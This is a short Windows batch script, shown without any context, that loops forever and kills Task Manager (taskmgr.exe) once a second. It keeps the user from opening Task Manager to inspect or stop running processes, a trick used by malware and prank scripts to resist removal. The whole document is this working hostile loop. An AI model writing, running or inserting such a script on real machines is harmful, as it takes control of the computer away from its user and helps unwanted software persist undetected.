:loop
taskkill.exe /IM taskmgr.exe
timeout /t 1 > nul
goto loop
